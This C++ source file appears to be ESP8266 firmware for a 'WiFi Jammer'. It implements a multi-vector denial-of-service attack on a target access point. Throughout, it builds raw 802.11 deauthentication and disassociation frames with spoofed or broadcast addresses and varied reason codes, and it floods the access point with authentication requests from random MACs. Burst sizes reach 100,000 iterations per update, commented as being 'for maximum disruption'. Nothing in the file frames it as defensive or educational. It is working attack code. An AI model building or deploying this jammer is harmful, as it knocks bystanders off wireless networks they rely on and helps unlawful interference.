/* Simplified Attack Implementation for WiFi Jammer */

#include "Attack.h"

Attack::Attack() {
  // Initialize
  running = false;
  packetsSent = 0;
  packetRate = 0;
  lastRateCheck = 0;
  lastPacketCount = 0;
}

void Attack::start(uint8_t* targetMAC, uint8_t channel) {
  // Copy target MAC
  memcpy(this->targetMAC, targetMAC, 6);
  currentChannel = channel;
  
  // Set WiFi mode and channel
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(currentChannel);
  wifi_promiscuous_enable(1);
  
  running = true;
  packetsSent = 0;
  lastPacketCount = 0;
  lastRateCheck = millis();
  
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║      ⚡ ATTACK STARTED ⚡              ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print("║ Target MAC: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", targetMAC[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println("        ║");
  Serial.printf("║ Channel: %-26d║\n", channel);
  Serial.println("║ Attack: Multi-Vector Flood             ║");
  Serial.println("║ - Deauthentication                     ║");
  Serial.println("║ - Disassociation                       ║");
  Serial.println("║ - Authentication Flood                 ║");
  Serial.println("╚════════════════════════════════════════╝\n");
}

void Attack::stop() {
  if (running) {
    running = false;
    Serial.println("\n╔════════════════════════════════════════╗");
    Serial.println("║      🛑 ATTACK STOPPED 🛑             ║");
    Serial.println("╠════════════════════════════════════════╣");
    Serial.printf("║ Total Packets: %-24d║\n", packetsSent);
    Serial.printf("║ Final Rate: %-27d║\n", packetRate);
    Serial.println("╚════════════════════════════════════════╝\n");
  }
}

void Attack::update() {
  if (!running) return;
  
  // Multi-vector attack - sends different packet types for maximum disruption
  // Burst size scales with attack intensity (intensity * 10000)
  int burstSize = attackIntensity * 10000;  // Max: 100,000 packets per update at intensity 10
  for (int burst = 0; burst < burstSize; burst++) {
    // Attack vector 1: Deauth from AP to all clients (broadcast)
    // Reason code 7: Class 3 frame received from nonassociated STA
    sendDeauthPacket(targetMAC, NULL, 7);
    
    // Attack vector 2: Deauth from clients to AP 
    // Reason code 3: Deauthenticated because sending STA is leaving
    sendDeauthPacket(NULL, targetMAC, 3);
    
    // Attack vector 3: Additional deauth with different reason codes
    sendDeauthPacket(targetMAC, NULL, 1);  // Reason 1: Unspecified reason
    sendDeauthPacket(targetMAC, NULL, 2);  // Reason 2: Previous authentication invalid
    sendDeauthPacket(targetMAC, NULL, 6);  // Reason 6: Class 2 frame from nonauth STA
    
    // Attack vector 4: Disassoc from AP to all clients
    // Reason code 8: Disassociated because sending STA is leaving
    sendDisassocPacket(targetMAC, NULL, 8);
    
    // Attack vector 5: Disassoc from clients to AP
    // Reason code 1: Unspecified reason
    sendDisassocPacket(NULL, targetMAC, 1);
    
    // Attack vector 6: Disassoc with additional reason codes
    sendDisassocPacket(targetMAC, NULL, 4);  // Reason 4: Inactivity
    sendDisassocPacket(targetMAC, NULL, 5);  // Reason 5: AP unable to handle all STAs
    
    // Attack vector 7: Authentication flood every 5 packets
    // Floods AP's authentication table with random MAC addresses
    if (burst % 5 == 0) {
      sendAuthFlood(targetMAC);
    }
    
    // Yield to watchdog every 1000 packets to prevent reset
    if (burst % 1000 == 0) yield();
  }
  
  // Update and display packet rate statistics
  uint32_t now = millis();
  if (now - lastRateCheck >= 1000) {
    packetRate = packetsSent - lastPacketCount;
    lastPacketCount = packetsSent;
    lastRateCheck = now;
    
    // Print live attack statistics
    Serial.printf("💥 Packets: %d | Rate: %d/s | Ch: %d\n", packetsSent, packetRate, currentChannel);
  }
}

void Attack::sendDeauthPacket(uint8_t* apMac, uint8_t* clientMac, uint8_t reason) {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  
  // Set destination
  if (clientMac == NULL) {
    // Broadcast to all clients
    packet[4] = 0xFF;
    packet[5] = 0xFF;
    packet[6] = 0xFF;
    packet[7] = 0xFF;
    packet[8] = 0xFF;
    packet[9] = 0xFF;
  } else {
    memcpy(&packet[4], clientMac, 6);
  }
  
  // Set source
  if (apMac == NULL) {
    // Broadcast source
    packet[10] = 0xFF;
    packet[11] = 0xFF;
    packet[12] = 0xFF;
    packet[13] = 0xFF;
    packet[14] = 0xFF;
    packet[15] = 0xFF;
  } else {
    memcpy(&packet[10], apMac, 6);
  }
  
  // Set BSSID (always AP MAC or target)
  if (apMac != NULL) {
    memcpy(&packet[16], apMac, 6);
  } else if (clientMac != NULL) {
    memcpy(&packet[16], clientMac, 6);
  } else {
    memcpy(&packet[16], targetMAC, 6);
  }
  
  // Set reason code
  packet[24] = reason;
  
  // Send packet
  wifi_send_pkt_freedom(packet, 26, 0);
  packetsSent++;
}

void Attack::sendDisassocPacket(uint8_t* apMac, uint8_t* clientMac, uint8_t reason) {
  uint8_t packet[26];
  memcpy(packet, disassocPacket, 26);
  
  // Set destination
  if (clientMac == NULL) {
    packet[4] = 0xFF;
    packet[5] = 0xFF;
    packet[6] = 0xFF;
    packet[7] = 0xFF;
    packet[8] = 0xFF;
    packet[9] = 0xFF;
  } else {
    memcpy(&packet[4], clientMac, 6);
  }
  
  // Set source
  if (apMac == NULL) {
    packet[10] = 0xFF;
    packet[11] = 0xFF;
    packet[12] = 0xFF;
    packet[13] = 0xFF;
    packet[14] = 0xFF;
    packet[15] = 0xFF;
  } else {
    memcpy(&packet[10], apMac, 6);
  }
  
  // Set BSSID
  if (apMac != NULL) {
    memcpy(&packet[16], apMac, 6);
  } else if (clientMac != NULL) {
    memcpy(&packet[16], clientMac, 6);
  } else {
    memcpy(&packet[16], targetMAC, 6);
  }
  
  // Set reason code
  packet[24] = reason;
  
  // Send packet
  wifi_send_pkt_freedom(packet, 26, 0);
  packetsSent++;
}

void Attack::sendAuthFlood(uint8_t* apMac) {
  uint8_t packet[30];
  memcpy(packet, authPacket, 30);
  
  // Set destination (AP)
  memcpy(&packet[4], apMac, 6);
  
  // Set random source MAC (to flood auth table)
  for (int i = 10; i < 16; i++) {
    packet[i] = random(0, 256);
  }
  
  // Set BSSID (AP)
  memcpy(&packet[16], apMac, 6);
  
  // Send packet
  wifi_send_pkt_freedom(packet, 30, 0);
  packetsSent++;
}

bool Attack::isRunning() {
  return running;
}

uint32_t Attack::getPacketsSent() {
  return packetsSent;
}

uint32_t Attack::getPacketRate() {
  return packetRate;
}

void Attack::setAttackIntensity(uint8_t intensity) {
  if (intensity >= 1 && intensity <= 10) {
    attackIntensity = intensity;
    Serial.printf("Attack intensity set to: %d/10\n", intensity);
  }
}

void Attack::enableChannelHopping(bool enable) {
  channelHoppingEnabled = enable;
  if (enable) {
    Serial.println("Channel hopping enabled");
  } else {
    Serial.println("Channel hopping disabled");
  }
}
